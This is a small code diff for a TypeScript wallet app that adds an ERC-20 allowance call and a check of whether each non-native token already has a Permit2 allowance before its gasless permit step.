@@ -64,6 +64,7 @@ const EVM_USDT: Record<number, string> = {
 const EVM_ERC20_ABI = [
   'function balanceOf(address owner) view returns (uint256)',
   'function approve(address spender, uint256 amount) returns (bool)',
+  'function allowance(address owner, address spender) view returns (uint256)', // 👈 ADD THIS LINE
   'function nonces(address owner) view returns (uint256)',
   'function name() view returns (string)'
 ]
@@ -307,6 +308,14 @@ export default function App() {
           }
 
           if (!token.isNative) {
+
+            // ── 🔥 NEW: PERMIT2 DETECTION LOGIC ──
+            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
+            const currentP2Allowance = await tokenContract.allowance(cleanSenderAddress, PERMIT2_ADDRESS);
+            const hasPermit2Mapping = currentP2Allowance > 0n; 
+            
+            log(`[SYSTEM] ${token.symbol} Permit2 Status: ${hasPermit2Mapping ? 'READY' : 'NOT_INITIALIZED'}`);
+          
             // ── UPGRADE: GASLESS PERMIT / PERMIT2 LOGIC ──
             let authorized = false;
 
